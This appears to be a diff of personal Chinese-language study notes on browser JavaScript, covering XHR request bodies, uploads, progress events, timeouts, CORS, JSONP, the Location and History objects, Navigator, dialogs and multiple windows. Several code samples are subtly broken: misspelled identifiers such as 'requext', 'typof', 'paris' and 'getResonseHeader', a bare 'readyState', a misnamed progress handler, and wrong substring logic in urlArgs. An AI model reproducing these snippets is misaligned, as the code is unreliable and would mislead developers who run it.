+	1.3 编码请求主体
+		表单编码的请求
+			编码后的表单数据则用做请求主体。
+			对每个表单元素的名字和值，用URL编码，使用十六进制转义码替换特殊字符。
+
+			表单数据编码格式，的MIME类型
+				application/x-www-form-urlencoded
+
+			设置请求头 Content-Type 
+
+			Ajax应用中，期望发送给 服务器的是一个 js对象。，表单的用户输入，看作对象。
+
+
+			function encodeFormData(data){
+				if (!data) return "";
+				var pairs = [];
+				for( var name in data){
+					if(!data.hasOwnProperty(name)) continue;
+					if(typeof data[name]=== "function") continue;
+					var value = data[name].toString();
+					name = encodeURIComponent(name.replace("%20","+"));
+					value = encodeURIComponent(value.replace("%20", "+"));   //编码
+					pairs.push(name+ "=" + value);
+				}
+
+				return pairs.join('&');
+			}
+
+			function postData(url,data, callback){
+				var request = new XMLHttpRequest();
+				request.open("POST",url);
+				request.onreadystatechange = function() {
+					if(readyState === 4 && callback){  // 当响应完成
+						callback(request);   // XHR对象传递给回调函数
+					}
+				};
+				request.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
+				requext.send(encodeFormData(data));
+			}
+
+			表单提交--只读查询，GET请求。没主体，所以需要发送给服务器的表单编码数据 "负载" 要作为URL 的查询部分。
+
+			function getData(url,data, callback){
+				var request = new XMLHttpRequest();
+				request.open("GET", url + "?" + encodeFormData(data));
+				request.onreadystatechange = function(){
+					if( readyState === 4 && callback){
+						callback(request);
+					}
+				};
+
+				request.send(null);
+			}
+
+			HTML表单在提交时，会对表单数据进行URL编码，但使用XHR能给我们 编码自己想要的任何数据。
+
+
+		2.JSON编码的请求
+
+		function postData(url,data, callback){
+			var request = new XMLHttpRequest();
+			request.open("POST",url);
+			request.onreadystatechange = function() {
+				if(readyState === 4 && callback){  // 当响应完成
+					callback(request);   // XHR对象传递给回调函数
+				}
+			};
+			request.setRequestHeader("Content-Type","application/json");
+			requext.send(JSON.stringify(data));
+		}
+
+
+		3.XML编码的请求
+		send()，可传入XML Document对象
+
+		创建一个简单的XML Document对象并 使用它作为HTTP请求的主体。
+
+		function postQuery(url, what, where, radius, callback) {
+			var request = new XMLHttpRequest();
+			request.open("POST", url);
+			request.onreadystatechange = function() {
+				if(request.readyState === 4 && callback){
+					callback(request);
+				}
+			};
+
+			// 创建一个XML　docuemnt 根元素 query
+			var doc = document.implementation.createDocument("", "query", null);
+			var query = doc.documentElement;
+			var find = doc.createElement("find");
+			query.appendChild(find);
+			find.setAttribute("zipcode",where);
+			find.setAttribute("radius", radius);
+
+			find.appendChild(doc.createTextNode(what));
+
+			// 想服务器发送XML编码的数据， 将自动设置 Content-Type
+			request.send(doc);
+		}
+		纯文本/XML 的请求主体，不必显式设置 Content-Type 头
+
+
+		4.上传文件
+		HTML表单的特性之一。 始终能上传文件。
+		File对象
+
+		每个上传文件元素 有个 files属性，是File对象中的类数组对象。
+
+
+		使用HTTP POST请求上传文件
+
+		whenReady(function(){
+			var elts = document.getElementsByTagName("input");
+
+			for(var i= 0; i < elts.length; i++) {
+				var input = elts[i];
+				if( input.type !== "file") continue;
+				var url = input.getAttribute("data-uploadto");  // 获取上传url
+				if(!url) continue;   // 跳过任何没有URL的元素
+
+				input.addEventListener("change", function() {  // 当用户选择文件时
+					var file = this.files[0];
+					if(!file) return;  // 没选择文件
+					var xhr = new XMLHttpRequest();
+					xhr.open("POST",url);  // 向该URL发送POST请求
+					xhr.send(file);       // 将文件作为主体发送
+				},false);
+			}
+		});
+
+		22.6 文件类型是 Blob类型中的一个子类型。
+
+		XHR2 允许，send()方法传入Blob对象。没设置Content-Type头时， 用 Blob对象的type 属性用于设置待上传的Content-Type
+
+
+		5. multipart/form-data 请求
+		当HTML 表单同时包含了 文件上传元素和其他元素。
+
+		浏览器不能用普通的表单编码，而必须使用 multipart/form-data 的 Content-Type，用POST方法提交表单。
+		这种编码
+			包括使用长 "边界" 字符串把请求主体分离成多个部分。
+
+
+		XHR2 定义了新的FormData API。
+			实现多部分请求主体。
+				FormData对象， append()方法
+			send()
+				该方法将对 请求定义合适的边界字符串 和设置"Content-Type" 头
+
+
+		function postFormData(url, data, callback){
+			if(typof FormData === "undefined")
+				throw new Error("FormData is not implemented");
+			var request = new XMLHttpRequest();
+			request.open("POST", url);
+			request.onreadystatechange = function(){
+				if(request.readyState === 4 && callback){
+					callback(request);
+				}
+			};
+
+			var formdata = new FormData();
+			for(var name in data){
+				if(!data.hasOwnProperty(name)) continue;
+				var value = data[name];
+				if(typeof value === "function") continue;
+
+				formdata.append(name, value);
+			}
+
+			 //在multipart/form-data 请求主体中发送 名值对
+			 //每对都是请求的 一部分
+
+			 request.send(formdata);
+		}
+
+
+18.1.4	HTTP进度事件
+	XHR2 的事件集
+
+	send()
+		触发单个loadstart 事件。
+		加载服务器响应时， XHR对象会发生 progress 事件 50ms， 用这些事件向用户 反馈请求进度。
+
+		请求快速完成， 可能不触发 progress事件。
+		事件完成， 触发load 事件。
+
+	完成的请求， load 事件的处理程序应该检查 XHR对象的状态码
+
+	HTTP请求无法完成
+		请求超时： 触发 timeout事件
+		中止:          abort事件
+		网络错误阻止请求完成(太多重定向) : error事件
+
+
+	若每种事件只有一个事件处理程序，只设置对应的处理程序属性。
+
+	这些progress事件相关联的事件对象：
+		属性：
+		type
+		timestamp
+		loaded 属性： 目前传输的字节数值
+		total 属性:  自 "Content-Length" 头 传输的数据的整体长度 (单位: 字节), 
+			若不知道内容长度 则为0
+			否则： lengthComputable属性 为true; 反之 false。
+
+		request.progress = function(e) {
+			if(e.lengthComputable){
+				progress.innerHTML = Math.round(100 * e.loaded/e.total)  + "% complete";
+			}
+		}
+
+
+		上传进度事件
+			监控HTTP 请求长传的事件
+			upload属性：
+		    值是一个对象
+				定义了  addEventListener()方法 和整个progress 事件集合。
+					onprogress onload
+				无onreadystatechange 属性
+				仅能触发新的事件类型。
+
+			如
+				XHR对象 x
+				设置x.onprogress 监控 响应的下载进度
+					x.upload.onprogress 以监控请求的上传进度。
+
+
+
+18.1.5  中止请求和超时
+	调用abort() 的主要原因是 请求取消、超时请求耗时太长、响应变得无关。
+	若 使用XHR 为文本输入域 请求 自动完成推荐。
+		用户在  服务器的响应到达前 输入新字符，此时等待请求应该中止。
+
+	实现超时
+
+		function timedGetText(url, timeout, callback){
+			var request = new XMLHttpRequest();
+			var timedout = false;
+
+			var timer = setTimeout(function() {
+				timedout = true;
+				request.abort();
+			},timeout);
+
+			request.open("GET", url);
+			request.onreadystatechange = function() {
+				if(request.readyState !== 4) return; // 忽略未完成请求
+				if(timedout) return;   // 忽略中止的请求
+				clearTimeout(timer);   // 取消等待的超时
+				if(request.status === 200){
+					callback(request.responseText);
+				}
+			};
+			request.send(null);
+		}
+
+
+18.1.6 跨域HTTP请求
+	作为同源策略的一部分，XHR 对象通常仅可以发起 和文档具有相同服务器 的HTTP 请求。
+		该限制关闭了安全漏洞，
+		也阻止了适合使用的跨域请求。
+	可在 form  iframe 元素中使用跨域URL，而浏览器显示最终的跨域文档。
+	但因为同源策略，浏览器不允许原始脚本查找跨域文档的内容，使用XHR， 文档内容都是通过responseText属性暴露，所以同源策略不允许XHR进行 跨域请求。
+
+	XHR 通过在HTTP 响应中选择发送合适的CORS允许跨域访问网站。
+	若浏览器支持 XHR的 CORS， 且实现跨域请求的网站决定使用CORS 允许跨域请求。
+
+	跨域请求工作
+		实现CORS 支持的工作不需要做任何事，
+
+		安全细节：
+			当使用open()传入用户名，密码时，此时绝不会通过跨域请求发送。
+			跨域请求通常不包含其他任何的用户证书:
+				cookie, HTTP身份验证令牌Token。
+				通常不作为请求的内容部分发送，
+				且作为跨域响应来接收的cookie都会丢弃。
+
+			需要凭证时：
+				xhr.withCredentials = true。/在send之前。
+				此做法不常见。
+
+****测试withCredentials的存在性是 测试浏览器是否支持 CORS 的一种方法。
+
+
+	使用HEAD 和 CORS请求 链接详细信息。
+
+
+		linkeddetails.js
+
+			whenReady(function(){
+				var supportsCORS = (new XMLHttpRequest()).withCredentials !== undefined;
+
+				var links = document.getElementsByTagName('a');
+				for(var i = 0; i < links.length; i ++){
+					var link = links[i];
+					if(!link.href)  continue;
+					if(link.title)  continue;
+
+					if(link.host !== location.host || link.protocol !== location.protocol){
+						link.title = "站外链接";
+						if(!supportsCORS) continue; // 若没有CORS支持就退出
+
+					}
+
+					// 注册事件处理程序
+					if(link.addEventListener){
+						link.addEventListener("mouseover", mouseoverHandler, false);
+					}
+					else{
+						link.attachEvent("onmouseover", mouseoverHandler);
+					}
+				}
+
+
+
+				function mouseoverHandler(e){
+					var link = e.target || e.srcElement;
+					var url = link.href;
+
+					var req = new XMLHttpRequest();
+					req.open("HEAD", url);
+					req.onreadystatechange = function(){
+
+						if(req.readyState !== 4) return;  // 忽略未完成的请求
+						if (req.status === 200) {
+							var type = req.getResonseHeader("Content-Type");
+							var size = req.getResonseHeader("Content-Length");
+							var date = req.getResponseHeader("Last-Modified");
+
+							// 工具提示中显示详细信息
+							link.title = "类型: "+ type + " \n" + "大小: " + size + " \n" + 
+							"时间: " + date;
+						}else {
+							if(!link.title)
+								link.title = "Couldn't fetch details: \n" + req.status + " " + req.statusText;
+						}
+					};
+					req.send(null);
+
+					if (link.removeEventListener) 
+						link.removeEventListener("mouseover", mouseoverHandler, false);
+					else
+						link.detachEvent("onmouseover",mouseoverHandler);
+				}
+			});
+
+
+18.2借助script 发送HTTP请求: JSONP
+	script 标签 的src属性设置， 浏览器将发送一个HTTP请求以下载 src属性指向的URL。
+
+	使用script 进行ajax传输：
+		不受同源策略影响，
+		包含JSON 编码数据的响应体 会自动解码(执行)。
+
+	脚本和安全性
+	使用script元素 作为Ajax 传输的技术成为JSONP。
+
+	JSONP 中P的意义。
+		响应：
+			包裹后的JSON响应
+				handleResponse(
+					[1,2,{"buckle": "my shoe"}]
+				)
+			包裹后的响应会成为 script元素的内容。
+				先判断JSON编码后的数据(毕竟是一个js表达式)
+				之后传递给 handleResponse函数。
+
+			必须以某种方式告诉服务，它正在从一个script元素调用。必须返回 一个JSONP响应。
+			http://siteA/xxx.html?json 
+			在URL中添加一个 查询参数，或 &json
+
+		实践中，
+			支持JSONP 的服务，不会强制指定 客户端必须实现的回调函数名称。
+			使用查询参数的值，允许客户端指定函数名，之后使用函数名去填充响应。
+
+
+		例子：
+			如何创建一个新的script元素，设置其 URL， 并插入到文档中。 
+			该插入操作触发 HTTP 请求。
+			注意，为每个请求都创建了全新的内部回调函数。回调函数作为 getJSONP() 函数的一属性存储。
+
+			回调函数的必要清理工作： 删除脚本元素，删除自身。
+
+		18-14 使用script元素发送JSONP请求
+
+			function getJSONP(url, callback){
+
+				var cbnum = "cb" + getJSONP.counter++;
+				var cbname = "getJSONP." + cbnum;  // 作为JSONP函数的属性
+
+				// 将回调函数名称以表单编码的形式添加到 URL
+				// 使用jsonp, 作为参数名，一些支持JSONP的服务。
+
+				if(url.indexOf("?") === -1)
+					url += "?jsonp=" + cbname;   // 作为查询部分添加参数
+
+				else
+					url += "&jsonp=" + cbname;  // 作为新的参数添加。
+
+				var script = document.createElement('script');
+
+				// 定义被脚本执行的回调函数
+				getJSONP[cbnum] = function(response){
+					try{
+						callback(response);
+					}
+					finally{
+						delete getJSONP[cbnum];  //删除该函数
+						script.parentNode.removeChild(script);
+					}
+				};
+
+				// 立即 触发HTTP 请求
+				script.src = url;
+				document.body.appendChild(script);
+
+			}
+			getJSONP.counter = 0;
+
+
+
+14.2浏览器定位和导航
+	Window对象的location 属性 : Location，表示该窗口中当前显示的文档的URL，并定义了方法使窗口载入新的文档
+
+	Document对象的 location: Location
+
+	window.location === document.location; -->true
+
+	document.URL,是文档首次载入后， 保存该文档的URL 的静态字符串。
+	若定位到文档中的片段标识符， Location对象会有相应更新， document.URL不变
+
+	1.解析URL。
+		Location 对象的 
+			href属性，字符串包含URL 的完整文本。
+			toString() 返回 href的值。
+			URL分解属性
+				protocol
+				host
+				hostname
+				port
+				pathname
+				search
+				同时被Link对象支持
+			hash
+				返回URL中的 "片段标识符" 部分。
+			search
+				返回?后的URL，
+
+
+		function urlArgs() {
+			var args = {};
+			var query = location.search.substring(1); // 查找到查询字符串，去掉 ?
+			var pairs = query.split("&");  
+			for(var i = 0; i < paris.length; i ++){
+				var pos = pairs[i].indexOf('=');
+				if(pos == -1)  continue;
+				var name = pairs[i].substring(0,pos);
+				var value = pairs[i].substring(pos,pos+1);
+
+				value = decodeURIComponent(value); // 对value解码 ?
+				args[name] = value;
+			}
+			return args;
+		}
+
+	2.载入新的文档
+		Location对象
+			assign(), 载入并显示指定URL的文档。
+				后退，浏览器回到原始文档，相同的脚本会再次载入新文档。
+			replace(), 在载入新文档之前，从浏览历史中将当前文档删除。
+
+			if(!XMLHttpRequest) location.replace("staticpage.html");
+
+			reload()
+				重载当前文档。
+			纯粹的片段标识符是，相对URL的一类
+				使文档滚动到某个位置。 location = "#top"; //特殊。
+
+			URL分解属性可写，重新赋值改变URL的位置，导致浏览器载入新文档，若改变hash, 在当前文档中跳转。
+			location.search = "?page=" + (pagenum+1);
+
+14.3
+	window对象的 history 属性引用该窗口的Historty对象。
+
+	窗口的浏览历史用文档和文档状态 列表的形式表示。
+
+		length:  浏览历史列表中的 元素数量，脚本不能访问已保存的URL。
+
+		back()
+		forward()
+		go() ;// 整数参数
+
+	窗口包含多个子窗口，
+		子窗口的历史穿插在主窗口历史
+		history.back() 有可能使子窗口 back
+	不通过载入新文档改变自身内容，
+		在动态创建的应用状态间跳转。>>>22.2
+
+	h5之前的历史管理
+		应用程序必须 在窗口历史记录中创建一个条目管理自身的历史记录，用历史条目关联自身的状态信息。
+		移动到不同历史条目， 联合该条目获取状态信息，且重新创建应用程序之前的 状态。
+
+		用隐藏的iframe 保存状态信息并在浏览器的历史中创建条目。
+
+		创建新的历史条目，用Document 对象的open() 和 write()动态地将 一个新文档写入隐藏窗体。
+		文档内容里应该 包含 重新创建应用状态 所需要的状态信息。
+		后退时， 隐藏的窗体内容会改变。
+
+		h5之前没生成事件来通知该改变，为了检测用户是否点击了后退，需要 定时器定时检测窗体。
+
+		***********
+		开发者使用现成的框架， jq的history插件。  Really Simple History。
+
+14.4浏览器和屏幕信息
+	window.navigator
+		Navigator对象。 netscape navigator。
+
+		测试在IE还是， Netscape中运行，这种浏览器嗅探方法有问题。
+		功能测试方法， 测试所需要的功能即可。
+
+		属性
+			appName
+				web浏览器全称。
+			appVersion
+				以数字开始，跟着包含浏览器厂商和版本信息的详细字符串。
+			userAgent
+				USER-AGENT HTTP头部中发送的字符串。包含了绝大部分信息。
+			platform。
+				运行浏览器的os信息。
+
+		使用navigator.userAgent 来进行浏览器嗅探。
+
+			var browser = (function(){
+				var s = navigator.userAgent.toLowerCase();
+				var match = /(webkit)[ \/]([\w.]+)/.exec(s) ||
+				/(opera)(?:.*version)?[ \/]([\w.]+)/.exec(s) || 
+				/(msie)([\w.]+)/.exec(s) ||
+				/compatible/.test(s) && /(mozilla)(?:.*? rv:([\w.]+))?/.exec(s) ||
+				[];
+				return {
+					name: match[1] || "",
+					version: match[2] || "0"
+				};
+			}())
+
+		onLine
+		geolocation 用户地理位置 22.1
+		javaEnable()
+		cookieEnable()?
+
+		Screen对象
+			availWidth/Height
+			colorDepth， bits-per-pixel
+			可用Screen对象来确定web应用是否运行在一个小屏幕设备上。
+
+14.5 对话框
+	alert()
+		显示消息并等待关闭
+	confirm()
+		产生阻塞。
+		返回bool值
+	prompt()
+		产生阻塞。
+		待用户输入字符串，返回该字符串。
+
+	showModalDialog()
+		模态对话框， 包含HTML格式。
+		参数：
+			用以指定提供对话框HTML 内容的URL
+			任意值(arr|| obj),该值在对话框的脚本中通过 window.dialogArguments属性的值访问。
+			非标准的列表。
+				name=value; 设置对话框的其他属性。
+
+		窗口关闭前不返回，关闭后， window.returnValue 的值是方法的返回值。
+
+		对话框的 HTML内容，往往包含用来设置returnValue 的确认按钮，若需要则 调用 window.close()
+
+
+14.6错误处理
+	onerror, 未捕获的异常传播到调用栈上时，就会调用。错误信息输出到js控制台。
+
+	window对象的 error事件 ，处理函数的调用，
+		参数:
+			描述错误的一条信息；
+			字符串，存放引发错误的js代码所在 文档的url;
+			文档中发生错误的行数。
+		返回值
+			false，它通知浏览器事件处理程序已经处理了错误。浏览器不应该显示它自己的错误信息。
+
+
+14.8多窗口
+	window.open()
+		参数
+			新窗口显示的文档的URL。
+				忽略了，就会使用空页面的URL about:blank
+			新打开的窗口的名字
+				已存在，就跳转。
+				否则，打开新的，并赋予名字
+				省略，使用 "_blank" 新的未命名窗口
+			****
+				脚本无法通过简单地猜测窗口名来操控窗口的应用。
+				只有设置了 allowed to navigate的页面才可以如此。
+			3参，
+				以,分隔的列表，包括大小，各种属性
+			4参
+				在第二个参数命名的是一个存在的窗口时，有用。
+				bool值，
+				声明了第一个参数指定的URL是 替换带哦窗口浏览历史的当前条目true;
+				还是创建新的。
+		返回值，
+			代表命名或新创建窗口的对象。
+		该方法创建的新窗口中
+			opener属性 引用打开它的脚本 的 window对象。
+		应用：
+			触发弹窗广告。
+
+	window.close()
+		和 document.close()区分。
+
+	iframe元素
+		name属性，
+			可用作一个链接的target属性
+			可用作 window.open()的第二个参数。
+
+
+	交互窗口中的js
+
+		共享函数时，
+			注意词法作用域的规则。
+			函数在定义的作用域内执行，不是调用的作用域。
+
+		构造函数。
+			在单独窗口有效
+		内置的类：
+			在所有窗口自动预定义
+			每个窗口都有构造函数的一个独立副本和 构造函数对一个原型对象的一个独立副本。
+
+		每个Window都有自己的原型对象。
+			这意味着 instanceof 操作符不能跨窗口工作。
+
+
+	WindowProxy对象
+		web浏览器每次向窗口或窗体中载入新的内容，都会开始一个新的 js执行上下文，包含一个新创建的全局对象。
+
+		客户端js有两个重要的对象。
+			客户端全局对象
+			WindowProxy代理对象
+
+				当在查询或设置window 对象的属性时， 会在窗口/体 的当前全局对象上查询或设置相同的属性。
+
+			由于它的代理行为
+				有更长的生命周期外；
+				代理对象表现得像真正的全局对象。
+
+			全局对象位于作用域链的顶端，
+			but
+			window、 top 、 parent 以及窗体的属性全返回代理对象。
+			window.open()方法也返回 代理对象。
+			this的值，也是代理对象。不是全局。
+
+		客户端js需要支持这种多重执行上下文。
